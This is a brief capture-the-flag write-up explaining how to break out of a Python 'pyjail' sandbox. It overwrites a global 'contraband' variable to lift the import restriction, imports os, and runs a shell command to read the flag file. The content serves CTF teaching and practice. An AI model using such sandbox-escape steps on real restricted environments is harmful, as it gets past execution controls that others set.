**This is a simple pyjail question with the source code: https://github.com/yonlif/0x41414141-CTF-writeups/blob/main/pyjail.md**

==This is a challenge solved on Feb 24th during our annual Hack the Computer Open the Box CTF.==

This pyjail code contains a global variable in which the solvers cannot access until they overwrite it with another string. 


Thus, the first step is to overwrite the global variable string.

```globals[‘contraband’] = ‘any string’```

Then they will see that they can import whatever they want.

```import os```

After importing os, they can "cat" (get it? hehe) the flag file to obtain the flag. 

```os.system("cat flag.txt")```